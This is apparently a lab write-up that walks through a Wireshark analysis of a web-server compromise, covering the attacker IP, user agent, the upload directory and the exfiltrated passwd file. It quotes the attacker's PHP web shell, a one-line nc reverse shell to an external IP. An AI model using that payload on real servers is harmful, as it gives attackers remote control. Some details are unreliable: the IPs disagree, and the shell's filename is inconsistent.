---
categories: [DFIR, Network Forensics]
tags: [wireshark, web attacks]
comments: true
---

# Web Strike Analysis

## Scenario

An anomaly was discovered within our company’s intranet when the Development team found an unusual file on one of our web servers. Suspecting potential malicious activity, the network team has prepared a pcap file with critical network traffic for analysis by the security team, and you have been tasked with analyzing the pcap.

## Questions

#### 1. Understanding the geographical origin of the attack aids in geo-blocking measures and threat intelligence analysis. What city did the attack originate from?

- This is a simple case of Geolocating using IP addresses. In Wireshark, I found the attacker’s IP by going to `Statistics => Conversations => IPv4`. The IP address of the attacker is 117.11.88.128. Plugging this into `ipgeolocation.io`, I get the country of China and the city of **Tianjin**.

![ipgeolocation.io reponse](https://cdn-images-1.medium.com/max/2000/1*G7Itdk1-5CvYizLZpG3r5w.png)_ipgeolocation.io reponse_

#### 2. Knowing the attacker’s user-agent assists in creating robust filtering rules. What’s the attacker’s user agent?

- The user-agent is found in the HTTP traffic. I selected a packet with the GET method because it’s the first thing I saw; you can choose any HTTP traffic with an HTTP header in the request. In the header of the request, in the user-agent line, there is a value of `Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0`.

#### 3. We need to identify if there were potential vulnerabilities exploited. What’s the name of the malicious web shell uploaded?

- Going to the `Statistics => Protocol Hierarchy`, I immediately saw “Compuserve GIF”

![Wireshark snapshot](https://cdn-images-1.medium.com/max/2000/1*_d772Rdy7xBy4DfDX1wM5w.png)_Wireshark snapshot_

- I remembered that the traffic was filled with requests for different resources on the site. Considering the question stating that a file was uploaded, I immediately extracted all the files in the pcap file. Looking around, I can see OS command injections being done. Looking at the upload(2).php file, we can see that a filename of “image.png.php” was uploaded, containing PHP code with the function of executing a shell and using Netcat to connect to the attacker’s IP address on port 8080. This essentially establishes a reverse shell, allowing the attacker to interact with the compromised server remotely.

- Line of code:

```php
<?php system(“rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 117.11.88.124 8080 >/tmp/f”);
```

#### 4. Knowing the directory where files uploaded are stored is important for reinforcing defenses against unauthorized access. Which directory is used by the website to store uploaded files?

- Looking further into the extracted files, in the upload(2) HTML response, we can see that a document was moved to the `http://shoporoma.com/reviews/uploads/` directory, indicating that the malicious script was stored there.

![](https://cdn-images-1.medium.com/max/2000/1*ozG3rBs0jLdF2E9yq-81uw.png)

#### 5. Identifying the port utilized by the web shell helps improve firewall configurations for blocking unauthorized outbound traffic. What port was used by the malicious web shell?

- This was straightforward, as we already found out from the PHP snippet that the attacker leverages port `8080`.

#### 6. Understanding the value of compromised data assists in prioritizing incident response actions. What file was the attacker trying to exfiltrate?

- Going back to our extracted files, as mentioned earlier, there were logs of OS commands being executed by the attacker. From finding out the current directory to getting the passwdfile, which was the goal of the attacker.

![](https://cdn-images-1.medium.com/max/2000/1*N4pXXpyKflvtigqanP-PJA.png)

#### **Summary**

In this scenario, the attacker found a file upload vulnerability wherein they were able to upload a malicious PHP script (`upload(2).php`). With that script, it then executed a shell that connected back to the attacker, allowing for backdoor access into the system. After gaining reverse shell access, the attacker performed reconnaissance on the environment, determining the directory, files, and the username of the account in the system. Afterward, the attacker exfiltrated the `passwd` file containing passwords for different accounts.

{% include comments.html %}
